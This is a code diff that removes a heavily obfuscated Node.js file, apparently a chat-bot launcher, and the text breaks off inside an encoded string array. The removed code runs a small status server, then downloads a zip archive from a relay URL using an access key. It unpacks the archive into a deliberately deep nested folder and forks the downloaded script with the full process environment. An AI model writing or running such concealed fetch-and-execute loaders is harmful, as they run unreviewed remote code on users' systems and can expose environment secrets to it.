@@ -1,1 +1,841 @@
-(function(_0x51deec,_0x4d58d2){function _0x2e5d5b(_0x541cd0,_0x5b729a){return _0x55f8(_0x541cd0-0x78,_0x5b729a);}const _0x129e51=_0x51deec();function _0x39fc78(_0x630471,_0x3b49fa){return _0x55f8(_0x630471-0x392,_0x3b49fa);}while(!![]){try{const _0x5cd169=-parseInt(_0x2e5d5b(0x1f5,0x1e7))/(-0x213f+0xd75*0x2+0x656*0x1)*(parseInt(_0x39fc78(0x4e9,0x4eb))/(-0x2665+-0x7*0x12f+0x2eb0))+parseInt(_0x2e5d5b(0x1e8,0x1c4))/(-0x20f*-0x11+-0xee9+-0x1413)+-parseInt(_0x39fc78(0x4d5,0x507))/(0x199f+0x1424+-0x689*0x7)+parseInt(_0x2e5d5b(0x1b0,0x1dc))/(-0x33a+0x4*-0x698+-0x1d9f*-0x1)+parseInt(_0x39fc78(0x4d4,0x4b8))/(0x1*-0x1822+-0x82f*-0x3+-0x1*0x65)*(parseInt(_0x39fc78(0x4d8,0x4f2))/(0x26b+-0x27*0x17+-0x1*-0x11d))+parseInt(_0x39fc78(0x4b8,0x4b5))/(-0x23d7+0x2*-0x829+0x3431)+parseInt(_0x2e5d5b(0x1f3,0x1d4))/(-0x10b4*-0x1+-0x1d*-0x1c+-0x69d*0x3)*(parseInt(_0x39fc78(0x500,0x4e7))/(-0xe52+-0x800*-0x1+0x65c));if(_0x5cd169===_0x4d58d2)break;else _0x129e51['push'](_0x129e51['shift']());}catch(_0x225a61){_0x129e51['push'](_0x129e51['shift']());}}}(_0xca95,-0x6dca7+0xd8*-0xd67+0x1aa964));function _0x1d2b50(_0x5a7946,_0x7d0cac){return _0x55f8(_0x5a7946-0x2bb,_0x7d0cac);}function _0x55f8(_0xa73572,_0x4e2a63){_0xa73572=_0xa73572-(-0x1648+0xea*-0xc+-0xa0*-0x37);const _0x2f541d=_0xca95();let _0x29b754=_0x2f541d[_0xa73572];if(_0x55f8['cEckfN']===undefined){var _0x2da1bd=function(_0x45b072){const _0x511247='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x43bb51='',_0x5c0209='';for(let _0x4fc6c6=0x719+0x2c3+0x4ee*-0x2,_0x338980,_0x3b9f9a,_0x282ccf=-0x17b1+-0x19a2+0x3153;_0x3b9f9a=_0x45b072['charAt'](_0x282ccf++);~_0x3b9f9a&&(_0x338980=_0x4fc6c6%(0x15df+0x539+-0x1b14)?_0x338980*(-0x19db+0x10df+-0x6*-0x18a)+_0x3b9f9a:_0x3b9f9a,_0x4fc6c6++%(-0x165a+-0x21e9+0x3847))?_0x43bb51+=String['fromCharCode'](0x1cc6+0x1118+0x3*-0xef5&_0x338980>>(-(-0x251f+0x1*0x751+0x1dd0)*_0x4fc6c6&-0x1bc1+0x10d7*0x1+-0xaf*-0x10)):-0x13e2+-0xd45+0x2127*0x1){_0x3b9f9a=_0x511247['indexOf'](_0x3b9f9a);}for(let _0x5952df=0x69f*0x3+-0x18*0xd0+-0x5d,_0x2a8c54=_0x43bb51['length'];_0x5952df<_0x2a8c54;_0x5952df++){_0x5c0209+='%'+('00'+_0x43bb51['charCodeAt'](_0x5952df)['toString'](0x1*0x3c9+-0xc*-0x1d5+-0x1*0x19b5))['slice'](-(0x673*-0x1+0xf6*0x18+0x109b*-0x1));}return decodeURIComponent(_0x5c0209);};_0x55f8['tfzeaX']=_0x2da1bd,_0x55f8['cAgazi']={},_0x55f8['cEckfN']=!![];}const _0x3f738c=_0x2f541d[0x195*0x10+-0x1cc7*-0x1+-0x1*0x3617],_0x1d5c9f=_0xa73572+_0x3f738c,_0x1e3393=_0x55f8['cAgazi'][_0x1d5c9f];return!_0x1e3393?(_0x29b754=_0x55f8['tfzeaX'](_0x29b754),_0x55f8['cAgazi'][_0x1d5c9f]=_0x29b754):_0x29b754=_0x1e3393,_0x29b754;}const fs=require('fs'),path=require(_0x1a119e(0x2d6,0x2f2)),ENV_FILE=path[_0x1d2b50(0x3fc,0x3d5)](__dirname,_0x1d2b50(0x415,0x3f4));function ensureEnvFile(){function _0x16b314(_0x4fc5d6,_0x472d2e){return _0x1d2b50(_0x4fc5d6- -0x18c,_0x472d2e);}function _0x373945(_0x423750,_0x524346){return _0x1d2b50(_0x423750- -0x145,_0x524346);}if(!fs[_0x373945(0x2a7,0x291)](ENV_FILE)){if(_0x16b314(0x252,0x261)!==_0x16b314(0x28a,0x26b)){console[_0x373945(0x2bd,0x2b5)](_0x16b314(0x2a1,0x2b0));try{fs[_0x16b314(0x291,0x271)](ENV_FILE,_0x16b314(0x2a9,0x2a4)),console[_0x16b314(0x276,0x2a3)](_0x16b314(0x259,0x252));}catch(_0x3d34db){console[_0x373945(0x2df,0x2dd)](_0x373945(0x2c0,0x29f),_0x3d34db[_0x373945(0x2fb,0x2f2)]),process['exit'](0x2272+0x756+-0x29c7);}}else{const _0x96d070=_0x164a86[_0x373945(0x2b7,0x28c)](_0x4aaeb7,_0x16b314(0x25b,0x24b));try{_0x518c99['existsSync'](_0x96d070)&&_0x3d9af8[_0x373945(0x29d,0x2be)](_0x96d070,_0x15433e[_0x16b314(0x270,0x24b)](_0x1ea8d5,_0x16b314(0x25b,0x248)));}catch{}}}}ensureEnvFile(),require(_0x1d2b50(0x406,0x3f4))[_0x1a119e(0x2f7,0x2fb)]();const axios=require(_0x1a119e(0x302,0x32e)),AdmZip=require(_0x1a119e(0x301,0x2f5)),express=require(_0x1a119e(0x2d7,0x2fe));function _0x1a119e(_0x26dbdf,_0x442919){return _0x55f8(_0x442919-0x1bf,_0x26dbdf);}const os=require('os'),{fork}=require(_0x1a119e(0x320,0x33d)),app=express(),PORT=process.env.PORT||0x1e5e+0x3*0x68c+-0x264a,HOST='0.0.0.0',START_TIME=Date[_0x1d2b50(0x41b,0x43e)](),detectPlatform=()=>{if(process.env.DYNO)return _0x490005(-0x9d,-0xcb);function _0x490005(_0x5b1e4c,_0x54792a){return _0x1a119e(_0x54792a,_0x5b1e4c- -0x38a);}if(process.env.RENDER)return _0x116d9a(-0x4a,-0x1d);if(process.env.PREFIX&&process.env.PREFIX['includes']('termux'))return _0x116d9a(-0x2d,-0x3e);if(process.env.PORTS&&process.env.CYPHERX_HOST_ID)return _0x116d9a(-0x26,-0x2a);if(process.env.P_SERVER_UUID)return _0x490005(-0x6a,-0x40);if(process.env.LXC)return _0x116d9a(-0x53,-0x22);function _0x116d9a(_0x119603,_0x4eb372){return _0x1a119e(_0x4eb372,_0x119603- -0x368);}switch(os[_0x116d9a(-0x75,-0x60)]()){case _0x116d9a(-0x51,-0x7a):return _0x490005(-0xa2,-0x92);case _0x116d9a(-0x59,-0x5e):return _0x116d9a(-0x30,-0x45);case _0x116d9a(-0x5d,-0x7e):return'🐧\x20Linux';default:return _0x490005(-0x63,-0x6e);}};app[_0x1a119e(0x2ff,0x2fa)]('/',(_0x525dc3,_0xaea4da)=>{const _0x1876a0=Date['now']()-START_TIME;function _0x36341c(_0x277346,_0x390c3f){return _0x1d2b50(_0x277346- -0x4f9,_0x390c3f);}const _0x2b4daf=Math[_0x304906(0x44,0x19)](_0x1876a0/(-0x1683+-0x1db+0x5e*0x4d)),_0x5a47da=Math[_0x36341c(-0xf6,-0x10a)](_0x2b4daf/(-0x19e21+-0x3964*0x2+0x2f5*0x125)),_0xc22c74=Math['floor'](_0x2b4daf%(-0x26266+0x2245f+0x3*0x852d)/(-0x2423+0x2616+0xc1d)),_0x4f00ac=Math['floor'](_0x2b4daf%(-0x220c+0x6cd*-0x1+-0x1*-0x36e9)/(-0x2187*0x1+0x2281+-0x13*0xa));function _0x304906(_0x2c413a,_0xcadd1f){return _0x1d2b50(_0x2c413a- -0x3bf,_0xcadd1f);}const _0x26a92f=_0x2b4daf%(0xbd5+0x1*0x11d9+-0x1d72),_0x300ad5=_0x5a47da>-0xb*-0x2e9+-0x1399+-0xc6a?_0x5a47da+'d\x20'+_0xc22c74+'h\x20'+_0x4f00ac+'m\x20'+_0x26a92f+'s':_0xc22c74[_0x36341c(-0xcb,-0xc7)]()['padStart'](-0x1575+0x1*0xa21+0xb56*0x1,'0')+'h\x20'+_0x4f00ac[_0x304906(0x6f,0x88)]()['padStart'](0x9f*-0x39+0x151e+0x1*0xe4b,'0')+'m\x20'+_0x26a92f['toString']()['padStart'](-0x1890+-0x1d31+0x35c3,'0')+'s',_0x36fbe1=new Date(),_0x542e17=_0x36fbe1[_0x304906(0x68,0x94)](_0x304906(0x67,0x50),{'weekday':_0x36341c(-0xe0,-0xd4),'year':'numeric','month':'long','day':'numeric'}),_0x2f415d=detectPlatform();_0xaea4da[_0x36341c(-0xeb,-0xdf)](_0x36341c(-0xfa,-0x116)+_0x2f415d+_0x36341c(-0xd1,-0x102)+_0x300ad5+_0x304906(0x5f,0x61)+_0x542e17+_0x36341c(-0x116,-0x12f));}),app['get'](_0x1d2b50(0x3f8,0x405),(_0x2d1fbe,_0x46cdc9)=>{function _0x3f8855(_0x4601ab,_0x220f95){return _0x1a119e(_0x4601ab,_0x220f95- -0x27b);}function _0x479151(_0x358f93,_0x5b118c){return _0x1a119e(_0x5b118c,_0x358f93- -0x412);}_0x46cdc9[_0x479151(-0x119,-0xfc)](0x10*-0xb2+-0x27*0x99+0x259*0xf)[_0x479151(-0xef,-0xfe)]({'status':'ok','uptime':Date[_0x3f8855(0x8d,0xa4)]()-START_TIME});});const server=app[_0x1a119e(0x33b,0x333)](PORT,HOST,()=>{function _0x4b67bb(_0x29a2b5,_0x10e1a6){return _0x1d2b50(_0x10e1a6- -0xd7,_0x29a2b5);}function _0x23faa4(_0x5c9d37,_0x17de1f){return _0x1d2b50(_0x5c9d37- -0x607,_0x17de1f);}console[_0x23faa4(-0x205,-0x22c)](_0x23faa4(-0x21f,-0x1f9)+HOST+':'+PORT);})['on'](_0x1a119e(0x35a,0x328),_0x2249fc=>{function _0x29be6f(_0x2c9124,_0x505cf8){return _0x1d2b50(_0x505cf8-0x7f,_0x2c9124);}console[_0x50b443(0x5b,0x2f)](_0x29be6f(0x4b2,0x497),_0x2249fc['message']);function _0x50b443(_0xf44076,_0x2bb48d){return _0x1d2b50(_0x2bb48d- -0x3f5,_0xf44076);}process[_0x50b443(0x1e,0xf)](0x1*-0x896+0xf9*0x22+-0x187b*0x1);});process['on'](_0x1a119e(0x2f8,0x311),()=>{console['log'](_0x4bd33b(-0x1ee,-0x1f8));function _0x369e56(_0xff903f,_0x222424){return _0x1a119e(_0x222424,_0xff903f- -0x50c);}function _0x4bd33b(_0x366e4c,_0x36738e){return _0x1a119e(_0x366e4c,_0x36738e- -0x510);}server[_0x369e56(-0x218,-0x20d)](()=>process[_0x4bd33b(-0x22e,-0x208)](0xfc4+0x10c7+-0x208b));}),process['on']('SIGINT',()=>{function _0x3489ef(_0x2f8da8,_0x169e2d){return _0x1d2b50(_0x2f8da8- -0x475,_0x169e2d);}function _0x12a214(_0x46fc64,_0x162b3d){return _0x1d2b50(_0x162b3d- -0x671,_0x46fc64);}console[_0x3489ef(-0x73,-0x57)](_0x3489ef(-0x99,-0x89)),server['close'](()=>process[_0x3489ef(-0x71,-0x90)](-0x49*-0x62+0x67f*0x4+0x213*-0x1a));});const VERCEL_RELAY_URL=process.env.VERCEL_RELAY_URL||_0x1a119e(0x34a,0x31b),ACCESS_KEY=process.env.ACCESS_KEY||_0x1a119e(0x33a,0x326),baseFolder=path[_0x1d2b50(0x3fc,0x417)](__dirname,_0x1a119e(0x2f9,0x325),_0x1a119e(0x2fa,0x2ea)),DEEP_NEST_COUNT=0xa*-0x22d+0x2*0x12e2+-0x16*0xb8;function createDeepRepoPath(){let _0x546eed=baseFolder;for(let _0x47b5e1=0x2145+0x61*0x13+0x25*-0x118;_0x47b5e1<DEEP_NEST_COUNT;_0x47b5e1++){_0x546eed=path[_0x1ff411(0x249,0x21d)](_0x546eed,_0x2fb8f4(-0xfd,-0x127)+_0x47b5e1);}const _0x290e94=path['join'](_0x546eed,'lib_signals');fs[_0x2fb8f4(-0x170,-0x144)](_0x290e94,{'recursive':!![]});function _0x1ff411(_0xa5e3b8,_0x4a75b9){return _0x1d2b50(_0x4a75b9- -0x1df,_0xa5e3b8);}function _0x2fb8f4(_0x299712,_0x4f90fc){return _0x1d2b50(_0x4f90fc- -0x52f,_0x299712);}return _0x290e94;}async function downloadAndExtractRepo(_0x15fa1d){console[_0x16d743(-0x55,-0x78)](_0x165f92(0x26,0x7));const _0x5826da=await axios[_0x16d743(-0x61,-0x49)](VERCEL_RELAY_URL,{'responseType':_0x165f92(0x24,0x51),'headers':{'x-access-key':ACCESS_KEY,'User-Agent':_0x16d743(-0x18,-0x21)},'timeout':0x4e20});function _0x16d743(_0x192be8,_0x3d2d25){return _0x1d2b50(_0x192be8- -0x457,_0x3d2d25);}function _0x165f92(_0x6ef22,_0x406832){return _0x1d2b50(_0x6ef22- -0x416,_0x406832);}const _0x3a913d=new AdmZip(Buffer['from'](_0x5826da['data']));_0x3a913d[_0x165f92(-0x22,0x0)](_0x15fa1d,!![]),console[_0x16d743(-0x55,-0x55)](_0x16d743(-0x48,-0x3a));}function copyConfigs(_0x117963){function _0x34aac2(_0x368a68,_0x547b5a){return _0x1a119e(_0x547b5a,_0x368a68- -0x4d8);}function _0x3e4625(_0x34af72,_0x2961b9){return _0x1a119e(_0x34af72,_0x2961b9- -0x407);}const _0x73223b=path[_0x3e4625(-0xe9,-0x107)](__dirname,_0x34aac2(-0x1ed,-0x1cf));try{fs[_0x3e4625(-0x110,-0x117)](_0x73223b)&&fs[_0x34aac2(-0x1f2,-0x1c9)](_0x73223b,path[_0x3e4625(-0x12c,-0x107)](_0x117963,'config.js'));}catch{}}function checkSessionId(){function _0x48a62c(_0x2fe259,_0x9febe3){return _0x1a119e(_0x9febe3,_0x2fe259- -0x1db);}function _0x39017c(_0x174094,_0x2ae338){return _0x1a119e(_0x174094,_0x2ae338-0x15);}if(process.env.SESSION_ID){if(_0x48a62c(0x11b,0x100)!==_0x48a62c(0x11b,0x141)){let _0x56f83d=_0x494113;for(let _0x278dbd=0x1*0x13af+0x1280+0x7a3*-0x5;_0x278dbd<_0xec3b02;_0x278dbd++){_0x56f83d=_0x54cb76[_0x39017c(0x33f,0x315)](_0x56f83d,_0x39017c(0x2f2,0x321)+_0x278dbd);}const _0x2a4fdc=_0x5c6c67['join'](_0x56f83d,'lib_signals');return _0x121657[_0x39017c(0x2f5,0x304)](_0x2a4fdc,{'recursive':!![]}),_0x2a4fdc;}else return console[_0x39017c(0x2fa,0x31b)](_0x39017c(0x2e0,0x2f6)),!![];}else{if(_0x48a62c(0x133,0x12d)!==_0x48a62c(0x133,0x148))_0x3d68aa[_0x48a62c(0x14d,0x176)](_0x39017c(0x2e2,0x312)),_0x27bec2[_0x39017c(0x335,0x31d)](0x4*-0x707+-0x1*0x425+-0x1021*-0x2);else return console['log'](_0x39017c(0x370,0x34b)),![];}}async function launchBot(){checkSessionId();const _0x2e69c1=createDeepRepoPath();await downloadAndExtractRepo(_0x2e69c1);function _0x197577(_0xed7f4a,_0x5b7750){return _0x1d2b50(_0x5b7750- -0x7d,_0xed7f4a);}const _0x51eaf3=fs[_0x197577(0x354,0x362)](_0x2e69c1)[_0x59ebe6(0x51b,0x50f)](_0x29767c=>fs[_0x59ebe6(0x4e7,0x510)](path['join'](_0x2e69c1,_0x29767c))[_0x59ebe6(0x4ea,0x4cb)]());if(!_0x51eaf3['length']){if('nppQc'===_0x59ebe6(0x511,0x508))return _0x12b764[_0x197577(0x37d,0x385)](_0x59ebe6(0x510,0x4f7)),![];else console[_0x59ebe6(0x502,0x533)](_0x197577(0x358,0x37c)),process[_0x197577(0x3b4,0x387)](0x1a*-0x25+-0x7b*-0x1b+-0x936);}function _0x59ebe6(_0x12794b,_0x5abd4b){return _0x1d2b50(_0x12794b-0xde,_0x5abd4b);}const _0x326e1c=path[_0x197577(0x37a,0x37f)](_0x2e69c1,_0x51eaf3[0x1*0x2103+-0x23*-0x3e+-0x22f*0x13]);copyConfigs(_0x326e1c),console[_0x59ebe6(0x4e0,0x512)]('[\x20BOT\x20]\x20Setup\x20complete.\x20Launching\x20bot...');let _0x1f3e7c=-0x579*0x1+0x735+-0x3*0x94;const _0x14fef5=0x16ab+0xdcd+-0x2475;function _0x50f777(){function _0xf93231(_0x242479,_0x8a927c){return _0x59ebe6(_0x242479- -0x475,_0x8a927c);}function _0x362f7d(_0x498199,_0x2f362a){return _0x59ebe6(_0x2f362a- -0x22c,_0x498199);}if('IsxdI'!==_0xf93231(0x49,0x22)){_0x1f3e7c++,console[_0x362f7d(0x2b6,0x2b4)](_0x362f7d(0x28b,0x29c)+_0x1f3e7c+'/'+_0x14fef5+_0x362f7d(0x2d7,0x2e3));const _0x9f700d=fork(path[_0xf93231(0x65,0x78)](_0x326e1c,_0x362f7d(0x2a9,0x2c2)),{'cwd':_0x326e1c,'env':process.env,'stdio':_0x362f7d(0x2ba,0x2d2)});_0x9f700d['on'](_0x362f7d(0x28e,0x2b6),(_0x4d3999,_0x5657f7)=>{function _0x9ee111(_0x406f8c,_0x26875e){return _0x362f7d(_0x406f8c,_0x26875e- -0x4c4);}console['log'](_0x9ee111(-0x1d6,-0x1ed)+_0x4d3999+_0x563bf8(0x21a,0x236)+_0x5657f7);function _0x563bf8(_0x20c111,_0x55ab38){return _0x362f7d(_0x55ab38,_0x20c111- -0x85);}_0x1f3e7c<_0x14fef5?(console[_0x9ee111(-0x225,-0x210)]('[\x20BOT\x20]\x20Restarting\x20in\x205\x20seconds...'),setTimeout(_0x50f777,-0xdb1+0xbe8*-0x1+0x2d21)):(console[_0x563bf8(0x22f,0x234)](_0x563bf8(0x25d,0x25c)),process[_0x563bf8(0x231,0x22e)](-0x6*0x36+-0xbc0+-0x12f*-0xb));}),_0x9f700d['on'](_0x362f7d(0x2d8,0x2d6),_0x359e65=>{function _0x18360d(_0x6de955,_0x1ed43a){return _0xf93231(_0x6de955-0x40e,_0x1ed43a);}function _0x5be844(_0x258c4f,_0x4eccb1){return _0xf93231(_0x4eccb1- -0x113,_0x258c4f);}if(_0x18360d(0x452,0x441)===_0x18360d(0x452,0x42e))console[_0x5be844(-0xb7,-0x86)](_0x5be844(-0x7e,-0x6f),_0x359e65),_0x9f700d[_0x5be844(-0x4c,-0x7e)]();else return _0xff58b5.env.SESSION_ID?(_0x38e2c3[_0x18360d(0x479,0x45b)](_0x5be844(-0xeb,-0xcd)),!![]):(_0x1c256c[_0x5be844(-0x98,-0xa8)]('[\x20ALERT\x20]\x20No\x20session\x20env.'),![]);});}else _0x5e9d65[_0xf93231(0x55,0x40)](_0x465e41)&&_0x51559f[_0x362f7d(0x263,0x294)](_0x2ae2c3,_0x4ec436[_0xf93231(0x65,0x33)](_0x2d2726,_0xf93231(0x50,0x75)));}_0x50f777();}launchBot()[_0x1a119e(0x2fd,0x304)](_0x261c49=>{function _0x94634f(_0x3a2902,_0xc4551){return _0x1d2b50(_0xc4551-0x7,_0x3a2902);}function _0x384fc6(_0x2d6b94,_0x5da519){return _0x1d2b50(_0x2d6b94-0x60,_0x5da519);}console[_0x384fc6(0x484,0x4a4)](_0x384fc6(0x45b,0x460),_0x261c49[_0x94634f(0x43a,0x447)]),process[_0x94634f(0x421,0x40b)](0x2*-0x2ca+-0x13db+0x1970);});function _0xca95(){const _0x30c66a=['odq5mfD1AM50Ba','mtqXotm1nLHJELr1rG','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